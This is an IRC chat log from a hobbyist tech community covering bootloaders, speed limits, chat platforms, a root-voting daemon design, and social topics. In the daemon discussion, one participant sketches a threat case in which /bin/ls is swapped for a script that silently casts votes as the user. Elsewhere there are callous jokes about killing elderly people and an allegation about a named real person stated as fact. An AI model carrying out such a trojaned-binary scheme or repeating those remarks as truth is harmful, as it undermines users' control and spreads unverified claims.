Jun 05 15:48:22 <john_cephalopoda>	The documentation doesn't tell me how to set UUIDs as HDD identifier, so when I got a DVD in my drive, GRUB won't boot.
Jun 05 15:48:45 <john_cephalopoda>	Because gpt1 becomes gpt0 when I got a DVD in the drive. Don't ask me why.
Jun 05 15:49:11 <john_cephalopoda>	That's why I should have stayed with Legacy BIOS and syslinux.
Jun 05 15:49:18 <john_cephalopoda>	And MBR.
Jun 05 15:49:34 <CompanionCube>	you know GRUB has a search command right
Jun 05 15:49:41 <CompanionCube>	to find stuff by UUID?
Jun 05 15:51:21 <john_cephalopoda>	All I find online when searching for GRUB and UUID is "It's so simple! Use the totally usable update-grub command that creates a 5 MB config file that is broken in some place. Have fun debugging it!"

Jun 05 16:00:16 <emily>	I like systemd-boot, too bad it's entangled in systemd.
Jun 05 16:00:28 <emily>	some things still package the years-old gummiboot instead which is before it was systemd-boot

Jun 07 03:40:00 <klange>	JP standard is 80. Slow as fuck.
Jun 07 03:40:29 <klange>	NZ was 100 nearly everywhere, from well-paved divided highways to roads made of gravel.
Jun 07 03:42:31 <klange>	California is mostly 105 (65mph), but there are a handful of 113 (70mph) highways.
Jun 07 03:42:34 <nortti>	klange: are there no roads that are >80 in Japan
Jun 07 03:42:38 <nortti>	+?
Jun 07 03:43:08 <klange>	There are supposedly a bunch of expressways that are 100 but I've never seen them. They're all digitally signed, and I've only ever seen 80.
Jun 07 03:43:20 <nortti>	ah
Jun 07 03:43:41 <nortti>	interesting, I wonder what the reasoning is
Jun 07 03:43:54 <klange>	And sometimes they're clocked all the way down to 60 due to weather / construction / fuck you
Jun 07 03:44:36 <nortti>	I guess here the main factor is less bad winters and better road maintenance down south
Jun 07 03:46:12 <nortti>	hm. now that I think of it, not sure if I've seen frost damage (is there a better term in english for when the ground freezes and due to that moves around, breaking roads?) on motorways
Jun 07 03:56:41 <FireFly>	Motorways in Sweden re usually 100, 110 or 120

Jun 07 06:56:02 <klange>	I don't believe it has anything to do with the Unicode table.
Jun 07 06:56:16 <klange>	It has to do with what language code is specified by the document or subelement.
Jun 07 06:56:42 <klange>	This is crucial to the proper rendering of documents that contain both Chinese and Japanese text, as they share codepoints.
Jun 07 06:57:02 <klange>	But Chinese renderings differ from Japanese renderings through slightly different stroke renditions.
Jun 07 06:58:42 <klange>	Also Chinese fonts love to look more handwritten, while Japan prefers more gothic (sans-serif) fonts

Jun 07 08:17:03 <john_cephalopoda>	Heh, DE is 50 km/h (31 mph) in cities and urban areas, 100 km/h (62 mph) outside cities on normal streets.
Jun 07 08:18:07 <john_cephalopoda>	On Autobahn, the recommended speed is 130 km/h (81 mph). When you have an accident and you are faster than that, it will be partially your fault in court.
Jun 07 08:18:59 <john_cephalopoda>	But you can drive with any speed in many areas. There are people driving 300 km/h+ (124 mph+). No matter how fast you are, there is always somebody behind you who is faster.
Jun 07 08:19:41 <john_cephalopoda>	Many areas have signs though that prohibit reaching top speed, usually limiting at 120 km/h.
Jun 07 08:30:54 <john_cephalopoda>	Lol, between '52 and '57 there were no speed limits at all.
Jun 07 08:31:31 <john_cephalopoda>	But fatalities were so high that they decided to re-introduce speed limits.
Jun 07 08:47:08 <zgrep>	I like how you said "when" instead of "if".
Jun 07 09:16:37 <john_cephalopoda>	"If" is probably better. Autobahn is a very safe road. Way more accidents on rural roads.

Jun 07 13:15:58 <sortie>	nortti: Thanks for the typo fix! Fixed, thanks!
Jun 07 13:16:44 <sortie>	nortti: udp(4) connect(2) checks if there is an initial step in the route from bound address to the remote address.
Jun 07 13:18:19 <sortie>	For instance, if the remote is 192.0.2.1 but there is no interface with the subnet 192.0.2.0/24 (or another subnet spanning that address), and no default route has been set up (the router), then it fails.
Jun 07 13:19:12 <sortie>	nortti: It can also happen if you bind the socket to a particular network interface without a default route and then try to connect to an address belonging to another network interface
Jun 07 13:20:25 <sortie>	nortti: It can also happen in Sortix if you bind a socket to the loopback address (127.0.0.1) and then try to connect to the public internet. Sortix doesn't have a route between the loopback network and the public internet. However, other systems do, so this may be a bug in Sortix. Or perhaps a feature.
Jun 07 13:20:57 <sortie>	(If you want to connect to the public internet, bind to 0.0.0.0:port rather than 127.0.0.1:port, or the actual address of the network interface in question)

Jun 07 14:16:22 <john_cephalopoda>	C++ templates are already a pretty obscure concept to me. They do some stuff with *things* which can be just shoved in, and it's figured out when it's compiled. I prefer to just write multiple functions for different data types or just manually cast something to something else to use a function on it.
Jun 07 14:16:38 <sortie>	puckipedia: Yeah rw is really small and simple, already confirmed it works and there's installation instructions on the website. I just need someone to make a quick package, submit it, and every few months / years update it with a new url and hash
Jun 07 14:16:50 <puckipedia>	sortie: right, I can send you a .recipe
Jun 07 14:17:25 <olsner>	john_cephalopoda: templates are just madness though, don't confuse them with types as they show up in Haskell etc

Jun 07 14:18:24 <john_cephalopoda>	I haven't done much with haskell. I had a lecture on scala some time ago (which I cancelled because I didn't get the basic concepts) and I kinda like how functions are very explicit about what they want.

Jun 07 14:19:58 <sortie>	There's some language at https://sortix.org/rw/ but 70 chars is a bit little let's write something real quick:

Jun 07 16:07:52 <hydraz>	"untyped" means "has no types". "auto" means the compiler isn't a retard and can figure this out
Jun 07 16:14:36 <john_cephalopoda>	Well, when using a compiled untyped language and a compiled language with auto for every variable and constant, the compiler has to figure out the type either way. Just one time the typing is implicit and one time it's explicit.
Jun 07 16:14:51 <john_cephalopoda>	Ah, badly phrased.
Jun 07 16:15:15 <john_cephalopoda>	One time it's implicitly stated that the compiler should decide, one time it's just assumed that the compiler will decide.

Jun 09 04:19:05 <john_cephalopoda>	"LOOK AT OUR INCREDIBLE OPEN-SOURCE PROJECT THAT IS DECENTRALIZED AND P2P AND HAS SO MUCH PRIVACY! You can contact the devs on discord."
Jun 09 04:21:15 <nortti>	what do you propose as an alternative? irc is p. niche even among techy ppl, forums are dead and UIwise not very fast, et cetera
Jun 09 04:22:45 <john_cephalopoda>	IRC is pretty widespread for open-source projects. It even has webchat. In every case enough for a quick (synchronous) chat with devs.
Jun 09 04:23:58 <john_cephalopoda>	It just feels weird to me, that open-source projects rely so much on a proprietary webapp that needs incredible amounts of JS to do anything.
Jun 09 04:25:29 <nortti>	irc webchat, unlike discord, has the issue where you ask a question, after couple hours need to go offline, and when the devs wake up they have no way to contact you
Jun 09 04:26:02 <john_cephalopoda>	Then there's also riot im/matrix.
Jun 09 04:26:22 <john_cephalopoda>	It even has a shitty electron app.
Jun 09 04:26:55 <nortti>	gotta admit I don't really know about those
Jun 09 04:27:36 <john_cephalopoda>	All the people on IRC who have names like username[m] are using the riot/matrix IRC bridge.
Jun 09 04:27:44 <nortti>	I know that much
Jun 09 04:28:30 <nortti>	but, like, how much work is it to set up that bridge? can you just give a link to someone and it will automatically do that, or do you need to fuck around in settings?
Jun 09 04:30:44 <john_cephalopoda>	nortti: You go to "Rooms" -> "Room directory" [dropdown] -> "Freenode", done.
Jun 09 04:31:39 <john_cephalopoda>	It's basically a transparent bridge.
Jun 09 04:32:58 <nortti>	okay, so you need to explain to users to do that now, and then how to join channels. versus discord, where you give them a link, and if they have an account, it automatically takes them to the right place
Jun 09 04:33:57 <nortti>	I agree, IRC is probably one of the least terrible channel-oriented chat systems. but it *is* pretty hard to get into, especially

Jun 09 07:10:20 <FireFly>	this one with a 8×16 grid cost me like 25 quid?
Jun 09 07:12:54 <FireFly>	It should also be entirely programmable, but unfortunately the programming software only runs on 32-bit windows, and the one I got requires the PS/2 cable to be directly plugged in (as opposed to using a PS/2-to-USB converter) for programming it :P
Jun 09 07:13:26 <FireFly>	(once programmed, adapters are offically supported, and it should just behave as a plain PS/2 keyboard AFAIK)

Jun 09 07:20:49 <hydraz>	(it still hurts but it has gotten below "my options are painkillers or amputation" levels)
Jun 09 07:20:57 <FireFly>	I forced myself to learn "proper" touchtyping when I made the switch to dvorak, since my muscle memory would be moot anyway

Jun 09 13:47:27 <john_cephalopoda>	nortti: #offtopia has really complex rules but no way to make voting automated in some way.
Jun 09 13:47:43 <nortti>	I am well aware
Jun 09 13:48:16 <nortti>	I was more poking fun at how you ask whether we need complex voting system in a place whose voting system is needlessly complicated
Jun 09 13:48:21 <john_cephalopoda>	I wonder if the issue of counting votes is Turing-complete or if it's not calculable.
Jun 09 13:49:03 <nortti>	(on the subject of weird irc channel running ways, come see ##intopicia where all of the channel rules must be held in the topic)

Jun 09 14:08:28 <nortti>	anyways, my main point is that there are things between "everyone has uncontrolled root access" and "complex daemon that fully controls system admin"

Jun 09 14:10:40 <zgrep>	It does, but a reboot usually fixes that. I guess updates should happen at predetermined times.

Jun 09 14:11:55 <nortti>	I see computer ppls' tendency to "let's build a system to automate this as far as possible" as the same thing as people from big orgs' tendency to "let's build a system of bureaucracy to limit the human element here"
Jun 09 14:12:23 <john_cephalopoda>	Just take away user's root rights and write a program to legalize shell scripts that are then automatically executed by root when legislated.
Jun 09 14:12:28 <nortti>	like, yeah, maybe that is good for a thing big enough, but what if there's less than 20 of us and we all know each other

Jun 09 14:13:55 <zgrep>	Is /etc everybody writeable? That's also potentially super dangerous.
Jun 09 14:14:11 <nortti>	we have a base level of trust between us. it doesn't have to be 100% evil-cracker resistant. and you can build into the system cases where you hand off some task to some person and, say, have the logs zgrep mentioned. switching onto "manual" isn't a failure

Jun 09 14:37:34 <zgrep>	Because I'm busy with other stuff too. So I thought: okay, everybody can do a little bit of the work, and hopefully it all doesn't fall apart. ahti at the moment is a nice test of trust / figuring out what I want, though.

Jun 12 06:56:15 <john_cephalopoda>	My father is professor of geology and mineralogy at an university. Sometimes citizens come to him with a weird stone they found and he will explain to them what it is.
Jun 12 06:57:52 <john_cephalopoda>	So one day a hysterical woman came to him with some flat, golden glitter, telling him how she found it in church and it was definitely gold placed there by angels who came down from the sky!
Jun 12 06:59:09 <john_cephalopoda>	So my father told her that it's most likely plastic glitter like you can buy in the party sections of stores, stuff that is thrown around at marriages. He also put it into a Raman spectrometer and it was definitely plastic.
Jun 12 06:59:48 <john_cephalopoda>	I believe that he even found a website that sold glitter confetti that had the exact shape of the pieces found by the woman in the church.

Jun 12 07:35:06 <nortti>	can you bitbang it fast enough?
Jun 12 07:36:08 <nortti>	I was under the impression the lowest speed for baseT ethernet is 10mbps, and it took effort to squeeze usb low speed (1.5MiB/s aiui) onto a small arm core, bitbanged

Jun 12 07:59:19 <john_cephalopoda>	Oh, Ziggurat for free on GOG.
Jun 12 07:59:24 <sgautam-laptop>	is it a good idea to support state sponsored baby making process by taking in genome from people and using it to create babies through artificial wombs (once we reach that level of scientific success) 
Jun 12 07:59:39 <nortti>	…why would one do that?
Jun 12 08:00:07 <sgautam-laptop>	i mean, from what it looks like a few countries seem to suffer from old age population crisis 
Jun 12 08:00:28 <john_cephalopoda>	sgautam-laptop: We could also just kill the old people.
Jun 12 08:00:38 <john_cephalopoda>	Way cheaper.

Jun 12 08:03:09 <sgautam-laptop>	nortti, but what happens when places with excess young populations also become industralized?

Jun 12 08:03:30 <sgautam-laptop>	i don't think i'm going to have kids, so do many young people of my age
Jun 12 08:03:43 <nortti>	indeed. that's why it is only the "we need labour right now" solution
Jun 12 08:03:43 <john_cephalopoda>	sgautam-laptop: Automate every job. Done.
Jun 12 08:03:55 <nortti>	more sustainable solution is a better allocation of resources

Jun 12 08:04:48 <sgautam-laptop>	i guess countries are doing that
Jun 12 08:04:53 <sgautam-laptop>	incentivized reproduction
Jun 12 08:05:08 <nortti>	no, as in, we have more than enough labour in industrialized countries
Jun 12 08:05:30 <nortti>	bullshit jobs are created just so that a system requiring vast majority of people to be employed can continue
Jun 12 08:05:36 <sgautam-laptop>	lol
Jun 12 08:05:40 <sgautam-laptop>	agree
Jun 12 08:06:37 <sgautam-laptop>	and here are we, so much population and potential for growth but jobs are scarce
Jun 12 08:06:41 <nortti>	even if the strain in elderly care is going to increase, if we incentivize people to look into such professions (which will require societal as well as economic changes – those jobs are hard but badly compensated and often seen "unmanly"
Jun 12 08:06:45 <nortti>	+)
Jun 12 08:07:14 <john_cephalopoda>	nortti: There are actually a lot of jobs. We are at an incredibly high percentage of employment in Germany right now, and companies are looking for people and there simply aren't any.
Jun 12 08:07:34 <john_cephalopoda>	We need doctors, car mechanics, carpenters, etc.
Jun 12 08:07:40 <nortti>	+then we do have the resources for that
Jun 12 08:08:05 <john_cephalopoda>	Elderly care is a shitty job. About 50% of people quit after a year or so.
Jun 12 08:08:09 <nortti>	john_cephalopoda: I guess the situation is that there aren't people with that training and getting that training would cost?
Jun 12 08:08:20 <sgautam-laptop>	it's not just being seen as unmanly though
Jun 12 08:08:26 <nortti>	re. doctors, carpenters, mechanics, etc.
Jun 12 08:08:34 <sgautam-laptop>	working with the sick/elderly is definitely not a fun process
Jun 12 08:08:49 <sgautam-laptop>	these people are likely to die in months, and often you'd be the first one to witness the event
Jun 12 08:08:53 <nortti>	right, that's why nursing needs to be one of the best-paying jobs
Jun 12 08:09:20 <john_cephalopoda>	nortti: The employers aren't even looking for trained people. They are looking for random people who want to do an apprenticeship.
Jun 12 08:09:57 <john_cephalopoda>	Of course somebody already schooled would be better, but nobody gets schooled without being an apprentice at one point.
Jun 12 08:09:59 <nortti>	would the people able to get money during the training from somewhere to cover their living expenses?
Jun 12 08:11:03 <john_cephalopoda>	sgautam-laptop: Not only death is the issue. You got bad hours, you have to work with people who need a lot of attention and you have to bathe them, wipe their asses, feed them and dress them.
Jun 12 08:11:21 <sgautam-laptop>	i have a serious question, talking of wiping ass
Jun 12 08:11:31 <sgautam-laptop>	do people just wipe their ass with tissue or what
Jun 12 08:11:36 <sgautam-laptop>	like no water?
Jun 12 08:11:47 <nortti>	many do
Jun 12 08:12:02 <sgautam-laptop>	:|
Jun 12 08:12:19 <sgautam-laptop>	i guess it's only weird for me
Jun 12 08:12:52 <nortti>	eh, once I started using bidets I've thought same tbh
Jun 12 08:13:48 <sgautam-laptop>	oh hmm shower guns are so better yes.
Jun 12 08:13:55 <john_cephalopoda>	Elderly people are like babies but they got dementia and don't look cute.
Jun 12 08:15:42 <vehk>	"Similar neo-reactionary movements are indicative of a certain sort of behavior common to fans but also peer groups in general: a desire to bring in or exile anyone who doesn’t satisfy their definition of a “fan” and similarly, a demand that games be developed in accordance with those values or not be defined as games at all." oh, this is a good point
Jun 12 08:15:53 <nortti>	john_cephalopoda: eh, depends on the person. also, I would argue your average elderly person, dementia or not, is still more able to take care of themselves than a baby
Jun 12 08:16:43 <sgautam-laptop>	talking of fans is celebrity-worship a thing in Europe/America
Jun 12 08:16:53 <nortti>	yes
Jun 12 08:18:01 <nortti>	or, well, what kind of behavour are you referring to, exactly?
Jun 12 08:18:02 <john_cephalopoda>	nortti: I meant elderly people in retirement homes. When they can still can care for themselves, they usually live in their house or flat, but the family moves them to the retirement home when they can't care for themselves any more.
Jun 12 08:18:53 <nortti>	right. but even one who has issues is usually able to do some things themselves. less so when nearing death tho
Jun 12 08:18:55 <john_cephalopoda>	Of course there are some who can care for themselves and are mentally and physically relatively fit. But the majority of people in retirement homes can't.
Jun 12 08:19:05 <sgautam-laptop>	nortti, I mean, people defending celebrities for doing crimes. And having specific fan pages where they post weird propaganda-kind-of stuff.
Jun 12 08:19:10 <nortti>	yes
Jun 12 08:20:14 <john_cephalopoda>	I did an internship in a retirement home once. Most people had dementia and other cognitive limitations. The one who watched them would go to toilet with them and note down the consistency of the stool and amount of liquid in a computer system afterwards.
Jun 12 08:21:38 <john_cephalopoda>	Some were cognitively quite clear, some were clouded. And they were really happy about attention. I walked around with some older woman who was so happy that I walked around with her. She really enjoyed it.
Jun 12 08:22:19 <john_cephalopoda>	Even just sitting with her and talking. 
Jun 12 08:22:31 <nortti>	mh
Jun 12 08:22:35 <sgautam-laptop>	like a celebrity literally got a free pass here for driving over a homeless person sleeping on a street (ended up killing him basically)
Jun 12 08:22:45 <sgautam-laptop>	and people were defending him
Jun 12 08:22:48 <sgautam-laptop>	fuckin
Jun 12 08:23:33 <john_cephalopoda>	sgautam-laptop: Celebrity is equal to anybody else in court. Of course money always help, but that's more a thing of wealth than of celebrity status.
Jun 12 08:23:47 <sgautam-laptop>	even if he couldn't be proved that he was the one who killed the person (beyond reasonable doubt) for the state to persecute him at least he should have been removed from Bollywood
Jun 12 08:24:11 <nortti>	I mean, it's similar in hollywood with abusers like johnny depp
Jun 12 08:24:36 <john_cephalopoda>	Huh, didn't hear about that yet.
Jun 12 08:24:40 <nortti>	there are even people who've attacked amber heard for bringing up the abuse
Jun 12 08:25:48 <sgautam-laptop>	like you gotta read some of the comments from his supporters, "why do homeless people sleep on the street?"
Jun 12 08:27:07 <sgautam-laptop>	the upper class in india is truly in disconnect with the rest of the country
Jun 12 08:29:14 <john_cephalopoda>	nortti: Reminds me how some people called the #MeToo stuff a witch hunt against those men. Somebody replied that it's indeed a witch hunt: When she says #metoo, then she is only looking for attention, when she doesn't say anything then nothing happened and everything is ok.
Jun 12 08:30:30 <nortti>	yeah, many people prefer lack of or limited action since it doesn't require the systems to be questioned
Jun 12 08:33:39 <john_cephalopoda>	When was the last time any system was questioned? 1989?
Jun 12 08:35:25 <nortti>	I mean, the thing around #metoo has been questioning the power of an "auteur" to mistreat his (because it's ~always a man) underlings

Jun 12 08:41:53 <sgautam-laptop>	vehk, their policy regarding such nicks
Jun 12 08:41:58 <sgautam-laptop>	it's banned apparently
Jun 12 09:01:12 <vehk>	'“Video games” couldn’t possibly have a canon, but the idea that they are “fun” “worth a certain time money investment” and “free from politics” are a canon, completely invented from whole cloth.'
Jun 12 09:01:33 <vehk>	I've always hated the notion of "worth a certain time money investment", and it seems that lots of reviewers go for that
Jun 12 09:01:58 <vehk>	"This came is 10 quid, so if you only get 2 hours of play time, totally worthless"
Jun 12 09:06:07 <vehk>	"You can make criticism in line with your values, and art in line with your values, but you can’t make someone else make it for you." <- I can honestly see the free market having created the sense of "people make games/movies/art for me"
Jun 12 09:06:41 <vehk>	It's when the line between product and expression blurs - something big studios even perpetuate themselves
Jun 12 09:07:22 <vehk>	Like, the whole E3 thing, I saw Bethesda's live stream. "We have made this game for you." "These features have been demanded by you, and we implemented them!"
Jun 12 09:07:37 <vehk>	It's not about having any sort of creative output anymore on the side of the creators, but it's about selling a product
Jun 12 09:08:04 <vehk>	So it's obvious that people will shift towards that attitude with smaller creators as well. Ones that just create for themselves.

Jun 12 10:23:25 <sgautam-laptop>	most people emigrating to gitlab after microsoft acquired it look pretty paranoid to me
Jun 12 10:23:31 <john_cephalopoda>	Tbh the github leaving reaction is a bit strong. Github is a fine platform and will continue to exist.
Jun 12 10:23:35 <sgautam-laptop>	or maybe it's the cool thing to do i guess
Jun 12 10:24:06 <sgautam-laptop>	john_cephalopoda, tmw microsoft acquires gitlab

Jun 12 10:24:33 <vehk>	Damn weechat doc
Jun 12 10:24:42 <john_cephalopoda>	If Microsoft decides to do "bad things"™, there is still time to switch to an other service. Just leaving the service right away is just not very clever.
Jun 12 10:24:54 <john_cephalopoda>	And switching to another centralized service is also not very clever.
Jun 12 10:26:26 <vehk>	Why does this have to be clever? If people leave just because it's Microsoft, then that is a valid reaction.

Jun 12 10:48:30 <nortti>	instead of the pixel art 2D action platformer that momo4 was
Jun 12 10:48:44 <john_cephalopoda>	vehk: It exists as package though: https://crux.nu/ports/crux-3.4/contrib/linux-pam/Pkgfile

Jun 12 10:49:43 <nortti>	pretty sure I've mentioned it
Jun 12 10:50:02 <vehk>	As if it's a betrayal to people
Jun 12 10:50:51 <nortti>	now he's doing a 2D action platformer unconnected to momodora series and has shelved momo5. rather ironically, I do sometimes feel myself wishing that he'd go back to momo5 at least when the new game is out
Jun 12 10:52:13 <nortti>	it's pretty interesting how "what a series should be" ends up codifying, too: none of the momodora games are that much like the previous one
Jun 12 10:54:22 <vehk>	mmh, yeah
Jun 12 10:55:49 <vehk>	Reminds me of the Bethesda E3 thing again. They announced a new DOOM game (of course, since the previous one sold well)
Jun 12 10:56:09 <vehk>	And it was advertised as "Now with two times as many demons" and "Now you'll play on Earth!"
Jun 12 10:56:20 <vehk>	And I was like: who the fuck cares, do something different
Jun 12 10:56:38 <nortti>	heh
Jun 12 10:56:51 <vehk>	Whereas the new Prey DLC looks amazing and has a very neat concept
Jun 12 10:56:57 <nortti>	oh?
Jun 12 10:57:12 <vehk>	Because they actually did something different. You're on the moon, and have to escape a space station
Jun 12 10:57:29 <vehk>	They basically have an environment, but shuffle encounters, loot, enemies, and all of that stuff around each time you play
Jun 12 10:57:59 <vehk>	I assume it's going to be more like a roguelite thing where you get a bit further every time you play

Jun 12 11:03:12 <nanovad>	nortti: I was going to try to have a shared "struct vote" definition, but it's basically just credentials + yes/no. Seeing as the client isn't the one defining its credentials (sorta), I don't need the credentials in the client
Jun 12 11:03:28 <nanovad>	I didn't know how UNIX sockets worked, if you could pass structs as binary or strings
Jun 12 11:03:40 <nanovad>	So I'm just going to use an intermediate format for the message passing
Jun 12 11:04:30 <olsner>	it's just a series of bytes, but serializing to a clearly defined format is what you want anyway - sending raw structs is a recipe for trouble

Jun 12 11:08:17 <nortti>	cool
Jun 12 11:08:29 <nortti>	how do you do credentials? pam?
Jun 12 11:08:51 <nanovad>	Unix socket credentials, SO_PASSCRED and SCM_CREDENTIALS
Jun 12 11:08:56 <nortti>	ah
Jun 12 11:09:25 <nanovad>	All I really need is "has this UID voted already?"
Jun 12 11:10:08 <nortti>	how do you prevent some script running the democracyd thing without user's approval, or do you feel that attack vector is unlikely enough that the UX improvement of not having to enter password is better 
Jun 12 11:11:05 <nanovad>	Hm, how do you mean a script running it without user's approval? Like, a script that su's into each user and votes?
Jun 12 11:11:44 <nortti>	no, as in, some utility script on ahti that gets a democracyd invocation added to it
Jun 12 11:12:51 <john_cephalopoda>	nortti: Just watched the Momo V alpha video. Looks nice.
Jun 12 11:13:00 <nanovad>	To propose or to vote? A script that just votes yes or no consistently doesn't seem very useful, to me…
Jun 12 11:13:06 <nanovad>	But maybe I'm misunderstanding
Jun 12 11:13:21 <nortti>	it could check some file to see how to make people vote
Jun 12 11:13:57 <nanovad>	hmm
Jun 12 11:14:07 <nanovad>	In any case the script would have to run as root to do that
Jun 12 11:14:17 <nortti>	how?
Jun 12 11:14:31 <nanovad>	The credentials given by SCM_CREDENTIALS are verified with the kernel aiui to make sure the user has privilege to pretend its UID is another
Jun 12 11:14:45 <nortti>	no, you are made to run that
Jun 12 11:15:12 <nortti>	or, say, /bin/ls gets replaced with a script that calls the real ls binary and then runs democracyclient vote $(cat /tmp/gogs/foobar/voteid) $(cat /tmp/gogs/foobar/vote)
Jun 12 11:15:19 <nanovad>	ah
Jun 12 11:15:31 <nanovad>	But everyone would have to agree to a proposal to replace ls with it
Jun 12 11:15:46 <nanovad>	So unless you had a majority of malicious actors, it'd be a non-issue
Jun 12 11:16:20 <nortti>	ah, I see the idea is that democracyd will be the only way to get root and the previous system state will be secure?
Jun 12 11:17:03 <nanovad>	That's the idea. The original admin would instate democracyd and (potentially) remove his own privs, and nothing else would gain root, except for exploits and the like
Jun 12 11:17:20 <nortti>	mh
Jun 12 11:18:06 <nortti>	and then it's basically "never run some other user's script unless it's installed through democracyd"?
Jun 12 11:19:12 <nanovad>	well the user would have a responsibility to see what the script does, I don't know how else you'd ensure that you're not unknowingly voting in the background. You'd notice once you started being unable to vote (seeing as you'd already cast a vote)
Jun 12 11:19:32 <john_cephalopoda>	nanovad: Why does democracyd have to force people to use it? Just tell people to either add the command "democracy status" to their .bashrc or to run it by hand sufficiently often.
Jun 12 11:19:35 <nanovad>	I wonder if it's easy to get the user to enter their account password for confirmation
Jun 12 11:20:10 <nortti>	you can't ever change your vote?
Jun 12 11:21:19 <nanovad>	Hm, I guess you could change it. I meant casting a second vote. Guess the best thing to do would be "You already cast your vote; would you like to change your vote to <new vote?"
Jun 12 11:21:28 <nortti>	mh
Jun 12 11:21:51 <nanovad>	john_cephalopoda: hmm, what do you mean? If it's to be useful at all as a democracy, you can't exactly have other people running around with root…
Jun 12 11:21:55 <john_cephalopoda>	user@server$ democracy status --->  Current proposals table: Title | Global proposal ID | Votes for/against | Own vote
Jun 12 11:22:26 <nanovad>	Yeah, I'm planning on having a status display
Jun 12 11:22:49 <nortti>	nanovad: why the extra confirmation step, tho? or would when you cast a vote there always be a "did you intend to vote for this?"
Jun 12 11:23:21 <nanovad>	Hm, that's probably better. I like the idea of having to run the client in the foreground/interactive
Jun 12 11:23:45 <john_cephalopoda>	Imo it would make sense to have a client that the user can run and the daemon. The client can be used to see what is voted for, to vote and to change votes.
Jun 12 11:23:51 <nanovad>	"Are you sure you want to vote <x> on proposal titled 'Update System Packages', proposal ID 1234?"
Jun 12 11:24:03 <nanovad>	john_cephalopoda: That's exactly what I'm doing, client/daemon model
Jun 12 11:24:27 <john_cephalopoda>	nanovad: Ah, wait, I mixed you up with nortti.
Jun 12 11:24:45 <nanovad>	Daemon runs, keeps track of active proposals and their votes, also handles execution of the proposals and logging, client just says "Hey I'm user foo and I want to vote bar"
Jun 12 11:24:45 <nortti>	hm?
Jun 12 11:24:54 <nanovad>	(or gets status, etc)
Jun 12 11:25:01 <nanovad>	That way the daemon can be run with privileges
Jun 12 11:25:19 <john_cephalopoda>	nortti: How about replacing the MOTD with the current votings?
Jun 12 11:25:39 <john_cephalopoda>	And the last 2 or 3 passed votings.
Jun 12 11:25:47 <nanovad>	hmm
Jun 12 11:25:48 <nortti>	that could work. aiui atm it's generated daily
Jun 12 11:25:59 <nanovad>	Doesn't ahti have something in the login scripts that cats a secondary motd?
Jun 12 11:26:04 <nanovad>	or is that generated and then written to the motd
Jun 12 11:26:16 <john_cephalopoda>	nortti: democracyd could just change the motd as soon as there's an update.
Jun 12 11:26:46 <nanovad>	That's a lot of rewriting, but I don't think it'd matter to rewrite that much. Could probably put vote tallies in there.
Jun 12 11:27:41 <nortti>	< nanovad> Doesn't ahti have something in the login scripts that cats a secondary motd? ← do you mean the fortune thing, or?
Jun 12 11:27:56 <nanovad>	Yeah, is that generated on login?
Jun 12 11:27:59 <CompanionCube>	yes
Jun 12 11:28:15 <CompanionCube>	well o
Jun 12 11:28:21 <nortti>	no, pretty sure it's part of the motd
Jun 12 11:28:40 <nortti>	yeah, it is
Jun 12 11:28:47 <nanovad>	ah
Jun 12 11:28:49 <vehk>	/etc/periodic/daily/motd
Jun 12 11:30:35 <nanovad>	Oh, also
Jun 12 11:31:07 <nanovad>	Seeing as democracyd won't have more than maybe a few clients voting at once, do you all think it's OK to fork to accept the connection and handle it, then the main loop goes back and accepts the next connection?
Jun 12 11:31:33 <nortti>	I'd say so, yeah
Jun 12 11:31:54 <nanovad>	From what I've been reading it seems the alternative is select(2)
Jun 12 11:31:59 <nanovad>	And that can get pretty complicated
Jun 12 11:32:29 <nanovad>	hm, actually, it wouldn't need an entirely new process, just a new thread
Jun 12 11:33:31 <nanovad>	oh, huh. TIL Linux threads are pretty much separate processes anyway
Jun 12 11:33:38 <nortti>	hm?
Jun 12 11:34:07 <nortti>	if you go the thread route, you could have it so that once it gets above N threads it will drop new ones
Jun 12 11:34:21 <nanovad>	Or block the connection
Jun 12 11:34:22 <nortti>	or send an error code back
Jun 12 11:34:36 <hydraz>	are you writing this in C?
Jun 12 11:34:51 <nanovad>	Honestly, I think that just blocking is okay. Votes or errors should take less than a second to go through, probably only a few ms in most cases
Jun 12 11:34:54 <nanovad>	hydraz: yeah

Jun 12 12:46:52 <nortti>	vehk: you've mentioned of how people have started to think of ownership of ideas due to intellectual property laws, right? I was reading a tumblr post about a pretty cool idea for a telepath magic user and thought I should keep that in mind for rpgs. I then scrolled down, saw that person's a published author, and had the kind of "would it be right, copying the idea from them?". I wonder what's the 
Jun 12 12:46:58 <nortti>	reasoning there, that I'd be somehow hurting a small-time author by using one of their ideas?
Jun 12 12:52:10 <vehk>	Mh. I'm pretty sure that you using that idea wouldn't really hurt an author in this case. Maybe the reasoning is just that the idea wasn't fully "your own", whatever that means.
Jun 12 12:53:04 <vehk>	The question is how much you have to change about an idea, or change the context in which an idea works, in order for it to be a new idea.
Jun 12 12:53:10 <nortti>	mh
Jun 12 12:53:47 <vehk>	And, in that case, whether any idea has ever been anyone's own

Jun 13 02:57:32 <shikhin>	Oh.
Jun 13 02:58:04 <S_Gautam>	another thing that's really fueled the whole caste politics is the reservation politics, there was a constant feeling of resentment towards the SC/STs where i went to study. i'm not really sure whether reservation quotas should be abolished or not, but it's definitely polarizing
Jun 13 02:58:33 <shikhin>	Oh, saw an interesting study yesterday, let's see if I can find it.
Jun 13 02:59:32 <shikhin>	Probably can't, gah… didn't read it in full detail because tired, but it was about how people from the reserved categories were harder working than the rest. (Probably misremembering something, though.)
Jun 13 03:00:56 <john_cephalopoda>	"Songs about life, love, and the devil's dog, Ralf"
Jun 13 03:02:55 <S_Gautam>	should affirmative action be for those who come from economically and socially favourable families but are historically from a marginalized group? 
Jun 13 03:03:46 <nortti>	does the group membership still create oppression?
Jun 13 03:04:02 <S_Gautam>	yes
Jun 13 03:04:09 <shikhin>	Yes (and questionable 'socially favourable'?).
Jun 13 03:04:44 <nortti>	knowing nothing else of the situation, I'd lean towards not making exceptions in the affirmative action thing
Jun 13 03:05:20 <nortti>	of course, since there are several axes of oppression and economic and social position too are such, there should also be systems to compensate for them
Jun 13 03:05:29 <S_Gautam>	shikhin: well, say someone from a dalit background who served as a district magistrate, should their children be given affirmative action? (giving an example)
Jun 13 03:05:31 <shikhin>	Note that there's already exceptions but that doesn't stop people from complaining.
Jun 13 03:06:48 <S_Gautam>	removing affirmative action completely is risky since it allows the reallocation of resources in a unfair manner, but the existing system isn't that great either.
Jun 13 03:07:07 <shikhin>	S_Gautam: I don't know what the right answer is (probably?), but I think those are currently also already not given reservation.
Jun 13 03:07:30 <shikhin>	Oh, sorry, they are.
Jun 13 03:07:43 <shikhin>	Not for people from OBCs, though.
